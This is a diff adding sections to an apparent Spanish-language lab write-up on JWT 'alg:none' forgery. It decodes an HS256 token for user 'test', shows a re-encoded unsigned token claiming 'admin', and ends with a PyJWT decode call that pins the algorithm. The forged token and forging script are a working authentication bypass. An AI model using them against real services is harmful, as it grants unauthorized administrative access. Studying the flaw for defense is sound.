@@ -89,3 +89,37 @@ forged_jwt = f"{new_header}.{new_payload}."
 print(f"[+] Token Falsificado Exitosamente:")
 print(forged_jwt)
 ```
+
+
+
+
+---
+
+
+
+
+## 4.  Flujo de la Modificación de Datos
+
+Al decodificar las dos primeras secciones del token original, obtenemos texto en formato JSON
+```
+:Header: {"alg":"HS256","typ":"JWS"} -> Indica que el servidor usó el algoritmo HMAC-SHA256.
+
+Payload: {"login":"test","iat":"1507755570"} -> Identifica al usuario actual como test.
+
+```
+
+## 5.  Re-codificación y Estructura Final
+Al volver a codificar, el token falsificado se verá así:
+```
+eyJhbGciOiJub25lIiwidHlwIjoiSldTIn0.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTUwNzc1NTU3MCJ9.
+
+```
+
+
+
+> ⚠️ **Nota Crítica: El token termina obligatoriamente en un punto (.). Esto le indica al parser del backend que la sección de la firma existe, pero está completamente vacía.**
+> # Ejemplo correcto usando PyJWT moderno
+jwt.decode(token, secret_key, algorithms=["HS256"])
+
+
+
